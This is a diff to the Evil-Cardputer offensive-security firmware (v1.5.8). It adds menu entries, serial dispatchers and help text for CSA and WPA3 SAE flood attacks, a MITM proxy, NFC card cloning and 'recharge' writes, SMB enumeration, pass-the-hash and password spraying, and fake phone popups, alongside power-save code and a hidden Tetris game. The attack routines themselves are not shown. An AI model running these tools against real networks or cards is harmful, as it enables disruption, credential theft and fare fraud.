@@ -225,6 +225,12 @@ void smbSerialPth(const String& args);     // headless: pass-the-hash login + li
 void smbSerialReport(const String& args);  // headless: recon report + access matrix to SD
 void smbSerialWrite(const String& args);   // headless: write-access test on a share
 void smbSerialSeed(const String& args);    // headless: seed common SMB wordlists to SD
+void smbSerialEnum(const String& args);     // headless: enum4linux-style SAMR/LSA recon (domain, policy, users)
+void calypso_serial_debug(const String& args); // headless: Calypso/ISO-14443-B layer-4 probe battery over serial
+void nfc_console(const String& args);           // headless: mini-PM3 HF serial console (A/B/F search, apdu, raw, reg, field)
+void chameleon_console(const String& args);      // headless: ChameleonUltra BLE client (connect, version, scan, ...)
+void st25tb_console(const String& args);          // headless: ST25TB read/save/write/restore (recharge PoC)
+void st25tbMenu();                                // on-screen ST25TB (read/save/restore)
 void sdHexHead(const String& args);        // hexdump first N bytes of an SD file
 void sdRemove(const String& args);         // delete an SD file
 void saveConfigString(String key, String value);  // write one string key=value in config.txt
@@ -415,6 +421,7 @@ static const char * const PROGMEM menuItems[] = {
   "Totem Compass",
   "Cap Sub-GHz",
   "Cap NFC",
+  "Chameleon",
   "WhisperPair",
   "Apple BLE Sniff",
   "WPS Auditor",
@@ -425,6 +432,11 @@ static const char * const PROGMEM menuItems[] = {
   "SMB Explorer",
   "PoisonMesh",
   "PoisonCore",
+  "IR Remote",
+  "Drone Detector",
+  "CSA Attack",
+  "WPA3 SAE",
+  "MITM Proxy",
   "Settings",
 };
 
@@ -864,6 +876,11 @@ int  caseToStartAtBoot = -1;       // index of menuItems[] / executeMenuItem cas
 int  bootCountdownSeconds = 3;     // countdown before auto-start (0 = no countdown)
 bool bootLaunchDone = false;       // internal guard to only trigger once
 int defaultBrightness = 255 * 0.35;                         //  35% default Brightness
+// Menu-idle power save (all configurable in Settings, 0 = disabled).
+int           powerDimAfter   = 0;    // seconds of menu idle before dimming
+int           powerDimLevel   = 20;   // brightness % once dimmed
+int           powerSleepAfter = 0;    // seconds after dimming before deep sleep
+unsigned long lastMenuActivity = 0;   // reset on any menu activity
 String selectedStartupImage = "/evil/img/startup-cardputer.jpg"; // Valeur par défaut
 String selectedStartupSound = "/evil/audio/sample.mp3";          // Valeur par défaut
 String selectedTheme = "/evil/theme.ini";                        // Selected Theme Default
@@ -925,10 +942,6 @@ File pcapFile;
 // deauth and pwnagotchi detector end
 
 // Sniff and deauth clients
-std::map<std::string, std::vector<std::string>> connections;
-std::map<std::string, std::string> ap_names;
-std::set<int> ap_channels;
-std::map<std::string, int> ap_channels_map;
 
 //If you change these value you need to change it also in the code on deauthClients function
 unsigned long lastScanTime = 0;
@@ -1292,10 +1305,13 @@ void navigatorInjectKeys() {
 static const int NAV_SCREEN_W = 240;
 static const int NAV_SCREEN_H = 135;
 static const int NAV_STRIP_H  = 9;   // 135 / 9 = 15 strips
-static uint16_t navStripBuf[NAV_SCREEN_W * NAV_STRIP_H];
-
 static void handleNavScreen() {
   if (!guardAdmin()) return;
+
+  // Strip buffer on the heap only for this handler call (was a permanent 4.3 KB
+  // global in .bss; now reclaimed whenever the navigator isn't actively streaming).
+  uint16_t* navStripBuf = (uint16_t*)malloc((size_t)NAV_SCREEN_W * NAV_STRIP_H * sizeof(uint16_t));
+  if (!navStripBuf) { server.send(500, "text/plain", "oom"); return; }
 
   int dataSize = 4 + NAV_SCREEN_W * NAV_SCREEN_H * 2;
   server.setContentLength(dataSize);
@@ -1314,6 +1330,7 @@ static void handleNavScreen() {
     server.client().write((const uint8_t*)navStripBuf, NAV_SCREEN_W * h * 2);
     yield();
   }
+  free(navStripBuf);
 }
 
 // ── Input endpoint ───────────────────────────────────────────────────────────
@@ -1689,6 +1706,10 @@ void crash_boot_log() {
   }
   if (f) f.close();
 }
+
+// Grow the Arduino loop task stack (default 8 KB) to 16 KB: deep call chains such
+// as the MJPEG viewer (JPEG decode + sprite) were overflowing it -> crash.
+SET_LOOP_TASK_STACK_SIZE(16 * 1024);
 
 void setup() {
   Serial.begin(115200);
@@ -2149,6 +2170,9 @@ void setup() {
   restoreConfigParameter("casetostartatboot");
   restoreConfigParameter("boot_countdown");
   restoreConfigParameter("totem_name");
+  restoreConfigParameter("dim_after");
+  restoreConfigParameter("dim_level");
+  restoreConfigParameter("sleep_after");
   int textY = 30;
   int lineOffset = 10;
   int lineY1 = textY - lineOffset;
@@ -2164,7 +2188,7 @@ void setup() {
   // Textes à afficher
   const char* text1 = "Evil-Cardputer";
   const char* text2 = "By 7h30th3r0n3";
-  const char* text3 = "v1.5.7 2026";
+  const char* text3 = "v1.5.8 2026";
 
   // Mesure de la largeur du texte et calcul de la position du curseur
   int text1Width = M5.Lcd.textWidth(text1);
@@ -2194,7 +2218,7 @@ void setup() {
   Serial.println(F("-------------------"));
   Serial.println(F("Evil-Cardputer"));
   Serial.println(F("By 7h30th3r0n3"));
-  Serial.println(F("v1.5.7 2026"));
+  Serial.println(F("v1.5.8 2026"));
   Serial.println(F("-------------------"));
   // Diviser randomMessage en deux lignes pour s'adapter à l'écran
   int maxCharsPerLine = screenWidth / 10;  // Estimation de 10 pixels par caractère
@@ -2480,6 +2504,54 @@ void hopKarmaChannel() {
   esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
 }
 
+#include "esp_sleep.h"
+// Menu-idle power save: dim after powerDimAfter s, LIGHT sleep after an extra
+// powerSleepAfter s. Only called while sitting at the menu, so it never cuts an
+// operation. Any key wakes the screen and resets the timer. Light sleep keeps
+// RAM/state and resumes instantly (no reboot) on any keyboard key press.
+void powerSaveMenuTick() {
+  static bool dimmed = false;
+  static uint8_t savedBri = 255;
+  if (kpAny()) {
+    lastMenuActivity = millis();
+    if (dimmed) { M5.Display.setBrightness(savedBri); dimmed = false; }
+    return;
+  }
+  unsigned long idle = millis() - lastMenuActivity;
+  if (powerDimAfter > 0 && !dimmed && idle >= (unsigned long)powerDimAfter * 1000UL) {
+    savedBri = M5.Display.getBrightness();
+    int lvl = 1 + powerDimLevel * 254 / 100;   // same 0-100% scale as the Brightness setting
+    if (lvl > savedBri) lvl = savedBri;         // never brighten, only dim
+    if (lvl < 1) lvl = 1;
+    M5.Display.setBrightness(lvl);
+    dimmed = true;
+  }
+  if (powerSleepAfter > 0 && idle >= (unsigned long)(powerDimAfter + powerSleepAfter) * 1000UL) {
+    // Light sleep in short slices, waking to scan the matrix keyboard. The demux
+    // (cols 8/9/11, rows 13/15/3/4/5/6/7) can't drive a clean "any-key" GPIO wake,
+    // so we timer-wake every ~150ms, poll the keys, and resume on ANY key press.
+    // RAM/state are kept -> instant resume, no reboot.
+    uint8_t bri = dimmed ? savedBri : M5.Display.getBrightness();
+    Serial.println(F("[POWER] light sleep (wake: any key)"));
+    M5.Display.sleep();
+    M5.Display.setBrightness(0);
+    bool wifiWas = (WiFi.getMode() != WIFI_MODE_NULL);
+    esp_wifi_stop();                               // real light sleep + power save
+    for (;;) {
+      esp_sleep_enable_timer_wakeup(150000ULL);    // 150 ms slice
+      esp_light_sleep_start();
+      M5.update(); cardUpdate();                   // scan the keyboard
+      if (kpAny()) break;                          // any key -> wake
+    }
+    if (wifiWas) { WiFi.mode(WIFI_STA); WiFi.begin(); }   // re-arm WiFi, non-blocking
+    M5.Display.wakeup();
+    M5.Display.setBrightness(bri);
+    dimmed = false;
+    lastMenuActivity = millis();
+    lastIndex = -1;            // force a clean menu redraw
+  }
+}
+
 void loop() {
   cardUpdate();
   navigatorInjectKeys();
@@ -2543,6 +2615,7 @@ void loop() {
       lastIndex = currentIndex;
     }
     handleMenuInput();
+    powerSaveMenuTick();
   } else {
     switch (currentStateKarma) {
       case StartScanKarma:
@@ -2738,6 +2811,7 @@ void cycleMenuZoom() {
 
 //-----------------------------------------------------------------------------------------------------
 void drawMenu() {
+  lastMenuActivity = millis();   // any redraw (navigation / return to menu) = activity
   // Toujours recalculer le layout ici (au cas où on entre/sort de SEARCH)
   applyMenuZoomLayout();
 
@@ -2789,12 +2863,32 @@ void drawMenu() {
 enum RogueDhcpMode : uint8_t { ROGUE_DHCP_STA = 0, ROGUE_DHCP_AP = 1 };
 void rogueDHCP(RogueDhcpMode mode);
 
+void chameleonMenu();   // ChameleonUltra BLE UI (defined after nfcMenu)
+namespace irr   { void menu(); void console(String a); }   // IR remote (defined in src/ir_remote.h, included later)
+namespace drone { void menu(); void console(String a); }   // Drone RemoteID detector
+namespace csa   { void menu(); void console(String a); }   // CSA (channel switch) attack
+namespace sae   { void menu(); void console(String a); }   // WPA3 / SAE toolkit
+namespace mitm  { void menu(); }                            // MITM proxy (AP+STA userspace relay)
+
 void executeMenuItem(int index) {
   inMenu = false;
   isOperationInProgress = true;
+  // "Chameleon" was inserted at menu index 91 (after "Cap NFC"). To avoid
+  // renumbering every later case, intercept it here and shift the rest back by
+  // one so the existing switch (cases 91..101) stays valid for items that
+  // followed Cap NFC. Zero-regression against the old index->case mapping.
+  // Chameleon sits at display 91 (after Cap NFC); the 4 newest tools sit at 102..105 (end, before Settings).
+  if (index == 91)  { chameleonMenu(); isOperationInProgress = false; inMenu = true; return; }
+  if (index == 102) { irr::menu();     isOperationInProgress = false; inMenu = true; return; }
+  if (index == 103) { drone::menu();   isOperationInProgress = false; inMenu = true; return; }
+  if (index == 104) { csa::menu();     isOperationInProgress = false; inMenu = true; return; }
+  if (index == 105) { sae::menu();     isOperationInProgress = false; inMenu = true; return; }
+  if (index == 106) { mitm::menu();    isOperationInProgress = false; inMenu = true; return; }
+  if (index > 106) index -= 6;        // Settings (display 107) -> original switch case 101
+  else if (index > 91) index -= 1;    // WhisperPair..PoisonCore (display 92..101) -> switch 91..100
   switch (index) {
     case 0:  scanWifiNetworks(); break;
-    case 1:  showWifiList(); break;
+    case 1:  showWifiList(false); break;
     case 2:  showWifiDetails(currentListIndex); break;
     case 3:  setWifiSSID(); break;
     case 4:  setWifiPassword(); break;
@@ -2816,7 +2910,7 @@ void executeMenuItem(int index) {
     case 20: wardrivingMode(); break;
     case 21: startWardivingMaster(); break;
     case 22: beaconAttack(); break;
-    case 23: deauthAttack(currentListIndex); break;
+    case 23: { int di = pickNetworkForDeauth(); if (di >= 0) deauthAttack(di); else { inMenu = true; drawMenu(); } break; }
     case 24: autoDeauther(); break;
     case 25: startEvilTwin(currentListIndex); break;
     case 26: sniffMaster(); break;
@@ -3202,6 +3296,162 @@ void hexToString(const uint8_t* data, size_t length, char* output) {
   output[length] = '\0';
 }
 
+// Hidden-in-the-hidden: EVILTRIS. No heap — a 10x17 playfield on the stack and
+// the piece table in flash. A/D move, W rotate, S soft drop, space hard drop,
+// DEL exit. Reached from doTheThing() with the backtick key.
+void doTheOtherThing() {
+  const int COLS = 10, ROWS = 17, CELL = 7;
+  const int WX = 6, WY = 8;                       // well top-left on screen
+  // bit = y*4 + x within a 4x4 box (generated + verified offline)
+  static const uint16_t TET[7][4] = {
+    {0x00F0, 0x4444, 0x0F00, 0x2222},  // I
+    {0x0066, 0x0CC0, 0x6600, 0x0330},  // O
+    {0x0072, 0x04C4, 0x4E00, 0x2320},  // T
+    {0x0036, 0x08C4, 0x6C00, 0x2310},  // S
+    {0x0063, 0x04C8, 0xC600, 0x1320},  // Z
+    {0x0071, 0x044C, 0x8E00, 0x3220},  // J
+    {0x0074, 0x0C44, 0x2E00, 0x2230},  // L
+  };
+  static const uint16_t COL[7] = {
+    0x07FF, 0xFFE0, 0xF81F, 0x07E0, 0xF800, 0x001F, 0xFD20   // I O T S Z J L
+  };
+
+  uint8_t field[ROWS][COLS];
+  memset(field, 0, sizeof(field));
+  int type, rot, px, py, nxt = (int)random(0, 7);
+  int hold = -1; bool holdUsed = false;           // hold/swap slot (once per piece)
+  int score = 0, lines = 0, level = 0, dropInt = 500;
+  bool over = false, dirty = true;
+
+  auto occ = [&](int t, int r, int cx, int cy) -> bool { return (TET[t][r] >> (cy * 4 + cx)) & 1; };
+  auto collide = [&](int t, int r, int ox, int oy) -> bool {
+    for (int cy = 0; cy < 4; cy++) for (int cx = 0; cx < 4; cx++) if (occ(t, r, cx, cy)) {
+      int bx = ox + cx, by = oy + cy;
+      if (bx < 0 || bx >= COLS || by >= ROWS) return true;
+      if (by >= 0 && field[by][bx]) return true;
+    }
+    return false;
+  };
+  auto spawn = [&]() {
+    type = nxt; nxt = (int)random(0, 7); rot = 0; px = COLS / 2 - 2; py = 0;
+    if (collide(type, rot, px, py)) over = true;
+  };
+  auto lockAndNext = [&]() {
+    for (int cy = 0; cy < 4; cy++) for (int cx = 0; cx < 4; cx++) if (occ(type, rot, cx, cy)) {
+      int bx = px + cx, by = py + cy;
+      if (by >= 0 && by < ROWS && bx >= 0 && bx < COLS) field[by][bx] = type + 1;
+    }
+    int cleared = 0;
+    for (int y = ROWS - 1; y >= 0; ) {
+      bool full = true; for (int x = 0; x < COLS; x++) if (!field[y][x]) { full = false; break; }
+      if (full) { for (int yy = y; yy > 0; yy--) memcpy(field[yy], field[yy - 1], COLS); memset(field[0], 0, COLS); cleared++; }
+      else y--;
+    }
+    if (cleared) {
+      static const int sc[5] = {0, 40, 100, 300, 1200};
+      lines += cleared; score += sc[cleared] * (level + 1); level = lines / 10;
+      dropInt = max(80, 500 - level * 45);
+    }
+    spawn();
+    holdUsed = false;                             // next piece may be held again
+  };
+
+  auto drawCell = [&](int x, int y, uint16_t c) {
+    if (y < 0) return;
+    M5.Lcd.fillRect(WX + x * CELL, WY + y * CELL, CELL - 1, CELL - 1, c);
+  };
+  auto drawMini = [&](int t, int bx, int by) {           // 4x4 preview, small cells
+    const int mc = 5;
+    M5.Lcd.fillRect(bx, by, 4 * mc, 4 * mc, BLACK);
+    if (t < 0) return;
+    for (int cy = 0; cy < 4; cy++) for (int cx = 0; cx < 4; cx++)
+      if ((TET[t][0] >> (cy * 4 + cx)) & 1)
+        M5.Lcd.fillRect(bx + cx * mc, by + cy * mc, mc - 1, mc - 1, COL[t]);
+  };
+  auto draw = [&]() {
+    // well
+    M5.Lcd.drawRect(WX - 2, WY - 2, COLS * CELL + 4, ROWS * CELL + 4, over ? RED : GREEN);
+    M5.Lcd.fillRect(WX, WY, COLS * CELL, ROWS * CELL, BLACK);
+    for (int y = 0; y < ROWS; y++) for (int x = 0; x < COLS; x++)
+      if (field[y][x]) drawCell(x, y, COL[field[y][x] - 1]);
+    if (!over) for (int cy = 0; cy < 4; cy++) for (int cx = 0; cx < 4; cx++)
+      if (occ(type, rot, cx, cy)) drawCell(px + cx, py + cy, COL[type]);
+    // panel
+    int PX = WX + COLS * CELL + 10;
+    M5.Lcd.setTextSize(1);
+    M5.Lcd.setTextColor(RED, BLACK);   M5.Lcd.setCursor(PX, 4);  M5.Lcd.print("EVILTRIS");
+    M5.Lcd.setTextColor(GREEN, BLACK);
+    M5.Lcd.setCursor(PX, 16); M5.Lcd.printf("SC %-7d", score);
+    M5.Lcd.setCursor(PX, 26); M5.Lcd.printf("LN %-5d", lines);
+    M5.Lcd.setCursor(PX, 36); M5.Lcd.printf("LV %-5d", level);
+    M5.Lcd.setTextColor(holdUsed ? 0x8410 : 0x5AEB, BLACK);
+    M5.Lcd.setCursor(PX, 50); M5.Lcd.print("HOLD"); drawMini(hold, PX, 60);
+    M5.Lcd.setTextColor(0x5AEB, BLACK);
+    M5.Lcd.setCursor(PX, 84); M5.Lcd.print("NEXT"); drawMini(nxt, PX, 94);
+    M5.Lcd.setTextColor(0x8410, BLACK);
+    M5.Lcd.setCursor(PX, 116); M5.Lcd.print(";rot ,/mv");
+    M5.Lcd.setCursor(PX, 126); M5.Lcd.print(". spc L");
+    if (over) {
+      M5.Lcd.setTextColor(RED, BLACK); M5.Lcd.setTextSize(1);
+      M5.Lcd.setCursor(WX + 4, WY + ROWS * CELL / 2 - 8); M5.Lcd.print("SYSTEM");
+      M5.Lcd.setCursor(WX + 6, WY + ROWS * CELL / 2 + 2); M5.Lcd.print("OWNED");
+    }
+  };
+
+  M5.Lcd.fillScreen(BLACK);
+  spawn();
+  uint32_t tMove = 0, tDrop = 0;
+  bool wPrev = false, spPrev = false, delPrev = false, hPrev = false;
+  enterDebounce();
+  while (true) {
+    M5.update(); cardUpdate();
+    uint32_t now = millis();
+    bool del = kp(KEY_BACKSPACE); if (del && !delPrev) { keyRelease(); return; } delPrev = del;
+    if (!over) {
+      if (now - tMove >= 90) {
+        if (kp(',')) { if (!collide(type, rot, px - 1, py)) { px--; dirty = true; } tMove = now; }
+        else if (kp('/')) { if (!collide(type, rot, px + 1, py)) { px++; dirty = true; } tMove = now; }
+      }
+      bool w = kp(';');
+      if (w && !wPrev) {
+        int nr = (rot + 1) & 3;
+        if (!collide(type, nr, px, py)) { rot = nr; dirty = true; }
+        else if (!collide(type, nr, px - 1, py)) { rot = nr; px--; dirty = true; }
+        else if (!collide(type, nr, px + 1, py)) { rot = nr; px++; dirty = true; }
+      }
+      wPrev = w;
+      bool h = kp('l');                            // hold / swap (once per piece)
+      if (h && !hPrev && !holdUsed) {
+        int t = type;
+        if (hold < 0) { hold = t; spawn(); }
+        else { type = hold; hold = t; rot = 0; px = COLS / 2 - 2; py = 0; if (collide(type, rot, px, py)) over = true; }
+        holdUsed = true; dirty = true;
+      }
+      hPrev = h;
+      bool sp = kp(' ') || kp(KEY_ENTER);
+      if (sp && !spPrev) { while (!collide(type, rot, px, py + 1)) py++; lockAndNext(); dirty = true; }
+      spPrev = sp;
+      int gi = kp('.') ? 45 : dropInt;
+      if (now - tDrop >= (uint32_t)gi) {
+        tDrop = now;
+        if (!collide(type, rot, px, py + 1)) py++; else lockAndNext();
+        dirty = true;
+      }
+    } else {
+      bool sp = kp(' ') || kp(KEY_ENTER);
+      if (sp && !spPrev) {
+        memset(field, 0, sizeof(field));
+        score = lines = level = 0; dropInt = 500; over = false;
+        hold = -1; holdUsed = false;
+        M5.Lcd.fillScreen(BLACK); spawn(); dirty = true;
+      }
+      spPrev = sp;
+    }
+    if (dirty) { draw(); dirty = false; }
+    delay(16);
+  }
+}
+
 void doTheThing() {
   M5.Lcd.fillScreen(BLACK);
   M5.Lcd.setTextColor(GREEN, BLACK);
@@ -3218,9 +3468,12 @@ void doTheThing() {
     M5.Lcd.println();
     delay(200);
   }
-  while (!kp(KEY_ENTER)) {
+  // The hidden has a hidden: ENTER returns, backtick (`) runs the other thing.
+  while (true) {
     M5.update();
     cardUpdate();
+    if (kp(KEY_ENTER)) { keyRelease(); break; }
+    if (kp('`')) { keyRelease(); doTheOtherThing(); break; }
     delay(100);
   }
   waitAndReturnToMenu("Return to menu");
@@ -3307,6 +3560,7 @@ void checkSerialCommands() {
     String command = Serial.readStringUntil('\n');
     command.trim();
     if (command == "ping") { Serial.println("[SER] pong"); return; }
+    if (command == "version") { if (g_jsonOut) Serial.println(F("{\"fw\":\"v1.5.8\",\"year\":2026}")); else Serial.println(F("Evil-Cardputer firmware v1.5.8 2026")); return; }
     if (command == "relayb") { if (!g_relay_active) g_launch = 1; return; }     // launched by loop(), not here (avoid re-entrancy)
     if (command.startsWith("vcard")) { if (!g_relay_active) { g_launch_prof = command.substring(5).toInt(); g_launch = 2; } return; }
     if (command == "relaystop") { g_relay_stop = true; return; }
@@ -3349,12 +3603,19 @@ void checkSerialCommands() {
       return;
     }
     if (command.startsWith("run ")) {
-      int idx = command.substring(4).toInt();
-      if (idx >= 0 && idx < menuSize) {
-        Serial.printf("[RUN] %d %s\n", idx, (const char*)menuItems[idx]);
-        executeMenuItem(idx);
-        Serial.println(F("[RUN] done"));
-      } else Serial.printf("Usage: run <0..%d>\n", menuSize - 1);
+      String arg = command.substring(4); arg.trim();
+      bool numeric = arg.length() > 0;
+      for (size_t i = 0; i < arg.length(); i++) if (!isdigit((unsigned char)arg[i])) { numeric = false; break; }
+      if (numeric) {
+        int idx = arg.toInt();
+        if (idx >= 0 && idx < menuSize) {
+          Serial.printf("[RUN] %d %s\n", idx, (const char*)menuItems[idx]);
+          executeMenuItem(idx);
+          Serial.println(F("[RUN] done"));
+        } else Serial.printf("Usage: run <0..%d> | run <name>\n", menuSize - 1);
+      } else {
+        runByName(arg.c_str());   // launch a menu item by its exact name
+      }
       return;
     }
     if (command == "sysinfo") {
@@ -3485,10 +3746,15 @@ void checkSerialCommands() {
     if (command.startsWith("smb_spider ")) { smbSerialSpider(command.substring(11)); return; }
     if (command.startsWith("smb_mirror ")) { smbSerialMirror(command.substring(11)); return; }
     if (command.startsWith("smb_spray ")) { smbSerialSpray(command.substring(10)); return; }
+    if (command.startsWith("nfc ")) { nfc_console(command.substring(4)); return; }
+    if (command.startsWith("nfcb")) { calypso_serial_debug(command.length() > 4 ? command.substring(5) : String("")); return; }
+    if (command.startsWith("chameleon")) { chameleon_console(command.length() > 9 ? command.substring(10) : String("")); return; }
+    if (command.startsWith("st25")) { st25tb_console(command.length() > 4 ? command.substring(5) : String("")); return; }
     if (command.startsWith("smb_pth ")) { smbSerialPth(command.substring(8)); return; }
     if (command.startsWith("smb_report")) { String v = command.substring(10); v.trim(); smbSerialReport(v); return; }
     if (command.startsWith("smb_write ")) { smbSerialWrite(command.substring(10)); return; }
     if (command.startsWith("smb_seed")) { String v = command.substring(8); v.trim(); smbSerialSeed(v); return; }
+    if (command.startsWith("smb_enum ")) { smbSerialEnum(command.substring(9)); return; }
     if (command.startsWith("sd_head ")) { sdHexHead(command.substring(8)); return; }
     if (command.startsWith("sd_rm ")) { sdRemove(command.substring(6)); return; }
 
@@ -3561,6 +3827,27 @@ void checkSerialCommands() {
       int r = a.substring(0, p1).toInt(), g = a.substring(p1 + 1, p2).toInt(), b = a.substring(p2 + 1).toInt();
       for (int i = 0; i < NUMPIXELS; i++) pixels.setPixelColor(i, pixels.Color(r, g, b));
       pixels.show(); Serial.printf("led %d %d %d ok\n", r, g, b); return;
+    }
+
+    // ── IR remote (38kHz TX on built-in IR LED, GPIO44) ──
+    if (command == "ir" || command.startsWith("ir ")) {
+      irr::console(command.length() > 2 ? command.substring(3) : String("help"));
+      return;
+    }
+    // ── Drone RemoteID detector (passive WiFi + BLE) ──
+    if (command == "drone" || command.startsWith("drone ")) {
+      drone::console(command.length() > 5 ? command.substring(6) : String("help"));
+      return;
+    }
+    // ── CSA (Channel Switch Announcement) attack ──
+    if (command == "csa" || command.startsWith("csa ")) {
+      csa::console(command.length() > 3 ? command.substring(4) : String("help"));
+      return;
+    }
+    // ── WPA3 / SAE checker + commit flood ──
+    if (command == "sae" || command.startsWith("sae ")) {
+      sae::console(command.length() > 3 ? command.substring(4) : String("help"));
+      return;
     }
 
     // ── GPIO / ADC / PWM (Grove G1=GPIO1, G2=GPIO2) ──
@@ -3729,9 +4016,19 @@ void checkSerialCommands() {
       inMenu = false;
       startAutoKarma();
       delay(200);
+    } else if (command == "sd" || command.startsWith("sd ")) {
+      sdSerialCmd(command.length() > 3 ? command.substring(3) : String(""));
     } else if (command == "help") {
       Serial.println(F("===================== Evil-Cardputer serial ====================="));
-      Serial.println(F("[AUTOMATION / NAV]  (piloter le Cardputer en serie)"));
+      Serial.println(F("HOW TO USE: type ONE command below, then press Enter. The reply"));
+      Serial.println(F("prints right here. Words in <..> are values YOU fill in; [..] is"));
+      Serial.println(F("optional. Some tools are their own console with extra commands:"));
+      Serial.println(F("type the name + ' help', e.g.  nfc help   smb_test   tag help"));
+      Serial.println(F("NEW HERE? try:  sysinfo   (device status) ->  scan_wifi   (see"));
+      Serial.println(F("networks) ->  nfc search   (read a card on the Cap NFC HAT)."));
+      Serial.println(F("Only use the attack tools on gear you are allowed to test."));
+      Serial.println(F("-----------------------------------------------------------------"));
+      Serial.println(F("[AUTOMATION / NAV]  drive the Cardputer's screen over serial"));
       Serial.println(F("  up|down|left|right|ok|enter|back - inject navigation"));
       Serial.println(F("  key <1-255>              - inject one ASCII/key code"));
       Serial.println(F("  menu                     - list menu functions (index, cursor)"));
@@ -3747,7 +4044,7 @@ void checkSerialCommands() {
       Serial.println(F("[ATTACKS] (launch by name)"));
       Serial.println(F("  crack_ntlm deauth beacon_spam handshake evil_twin"));
       Serial.println(F("  responder cctv_scan scan_hosts scan_full wardrive karma_auto"));
-      Serial.println(F("[WIFI / PORTAL]"));
+      Serial.println(F("[WIFI / PORTAL]  scan, join, and run a fake login page"));
       Serial.println(F("  scan_wifi / scan_results / select_network <i> / detail_ssid <i>"));
       Serial.println(F("  wifi_connect <ssid> [pw] / wifi_status / wifi_disconnect"));
       Serial.println(F("  change_ssid <name> / set_ssid <name> / set_password <pw> / set_mac <mac>"));
@@ -3760,7 +4057,7 @@ void checkSerialCommands() {
       Serial.println(F("[HW I/O] (Grove G1=1, G2=2)"));
       Serial.println(F("  gpio mode|read|write <pin> ... / adc <pin> / pwm <pin> <duty> [freq]"));
       Serial.println(F("  led <r> <g> <b> | led off"));
-      Serial.println(F("[PROBES]"));
+      Serial.println(F("[PROBES]  WiFi probe-request capture / karma replay"));
       Serial.println(F("  probe_attack / stop_probe_attack"));
       Serial.println(F("  probe_sniffing / stop_probe_sniffing"));
       Serial.println(F("  list_probes / select_probes <i> / karma_auto"));
@@ -3769,13 +4066,13 @@ void checkSerialCommands() {
       Serial.println(F("  vcard<N>                 - emulate card profile N"));
       Serial.println(F("  relaystop                - stop relay/emulation"));
       Serial.println(F("  relaylog [clear]         - show or clear the relay log"));
-      Serial.println(F("[CIW zeroclick]"));
+      Serial.println(F("[CIW zeroclick]  push fake update/pairing popups to phones"));
       Serial.println(F("  ciw_start / ciw_stop / ciw_status"));
-      Serial.println(F("[TagTinker ESL]"));
+      Serial.println(F("[TagTinker ESL]  electronic shelf-label (price tag) control"));
       Serial.println(F("  tag blink|blink_alert|debug|page <N>"));
       Serial.println(F("  tag led <BARCODE> [s] / tag text <BARCODE> msg"));
       Serial.println(F("  tag rawsend N HH HH.. / tag help"));
-      Serial.println(F("[SMB EXPLORER] (paths use \\ separators)"));
+      Serial.println(F("[SMB EXPLORER]  browse/attack Windows file shares (paths use \\)"));
       Serial.println(F("  smb_discover             - ARP sweep /24 + 445 probe -> hosts"));
       Serial.println(F("  smb_test [ip] [guest]    - neg/auth/enum/list-root pipeline"));
       Serial.println(F("  smb_ls <ip> <share> [path]      - list one directory"));
@@ -3783,6 +4080,7 @@ void checkSerialCommands() {
       Serial.println(F("  smb_login <ip> <share> <user> <pass> [path] - credentialed login"));
       Serial.println(F("  smb_pth <ip> <user> <nthash32> [share]      - pass-the-hash login"));
       Serial.println(F("  smb_spray <ip> [share]   - spray SD creds wordlist (NTLMv2)"));
+      Serial.println(F("  smb_enum <ip> [user] [pass] - enum4linux: domain/SID, pwd+lockout policy, users"));
       Serial.println(F("  smb_seed [force]         - write common SMB user/pass lists to SD"));
       Serial.println(F("  smb_report [ip]          - recon + R/W access matrix -> SD"));
       Serial.println(F("  smb_write <ip> <share> [path]   - write-access test (active)"));
@@ -3794,6 +4092,16 @@ void checkSerialCommands() {
       Serial.println(F("  arp_dump                 - dump the live ARP table"));
       Serial.println(F("  sd_head <path> [n]       - hexdump first n bytes of an SD file"));
       Serial.println(F("  sd_rm <path>             - delete an SD file"));
+      Serial.println(F("[NFC / BLE CONSOLES]  (type '<name> help' for subcommands)"));
+      Serial.println(F("  nfc <cmd>       - mini-PM3 HF: search/read/mfc/emv/ul/desfire/apdu/raw/reg/field"));
+      Serial.println(F("  nfcb <cmd>      - Calypso/ISO-B debug: strategies/dump/decode/scan/apdu/reg"));
+      Serial.println(F("  chameleon <cmd> - ChameleonUltra over BLE: connect/scan/dump/emulate/lfclone"));
+      Serial.println(F("  st25 <cmd>      - ST25TB/SRI: read/write/restore/tear (recharge PoC)"));
+      Serial.println(F("  ir <cmd>        - IR TX (GPIO44): nec/necext/samsung/sirc/rc5/raw/file/power/dazzle/add/ls"));
+      Serial.println(F("  drone <cmd>     - Drone RemoteID passive detect (OpenDroneID): wifi/ble/list"));
+      Serial.println(F("  csa <cmd>       - CSA channel-switch attack: csa <bssid> <ch> [ssid]"));
+      Serial.println(F("  sae <cmd>       - WPA3/SAE: sae check | sae flood <bssid> <ch>"));
+      Serial.println(F("  version                  - firmware version"));
       Serial.println(F("================================================================="));
     } else if (command == "ciw_start") {
       ciwLoadPayloads(ciwSelectedCats);
@@ -3936,7 +4244,10 @@ void scanWifiNetworks() {
 
 }
 
-void showWifiList() {
+// pickOnly=false : comportement historique (Select Network, propose la connexion).
+// pickOnly=true  : mode sélecteur, ENTER renvoie l'index choisi, BACK renvoie -1
+//                  (utilisé par le Deauther pour choisir la cible au lancement).
+int showWifiList(bool pickOnly) {
   const int ROW_H = 13;
   const int LEFT_PAD = 2;
   const int ICON_W = 28;
@@ -4006,6 +4317,7 @@ void showWifiList() {
     chanCache[i] = (uint8_t)WiFi.channel(i);
     lockCache[i] = isLocked(i);
   }
+  if (currentListIndex < 0 || currentListIndex >= numSsid) currentListIndex = 0;
 
   static bool prevUp = false, prevDown = false;
   static unsigned long upHoldStart = 0, downHoldStart = 0;
@@ -4108,16 +4420,29 @@ void showWifiList() {
 
     // ENTER
     if (kp(KEY_ENTER) && !keyHandledEnter) {
+      if (pickOnly) { enterDebounce(); return currentListIndex; }   // selector mode: hand the index back
       inMenu = true;
+      String sel = ssidList[currentListIndex];
       Serial.println(F("-------------------"));
-      Serial.println("SSID " + ssidList[currentListIndex] + " selected");
+      Serial.println("SSID " + sel + " selected");
       Serial.println(F("-------------------"));
-      waitAndReturnToMenu(ssidList[currentListIndex] + " selected");
+      if (ssid == sel) {                                 // saved network in the list -> offer to connect
+        if (confirmPopup("Connect to saved net?")) {
+          if (WiFi.localIP().toString() != "0.0.0.0") WiFi.disconnect(true);
+          if (connectToWiFi(sel, password)) waitAndReturnToMenu("Connected to WiFi: " + sel);
+          else                              waitAndReturnToMenu("Failed to connect: " + sel);
+        } else {
+          waitAndReturnToMenu(sel + " selected");
+        }
+      } else {
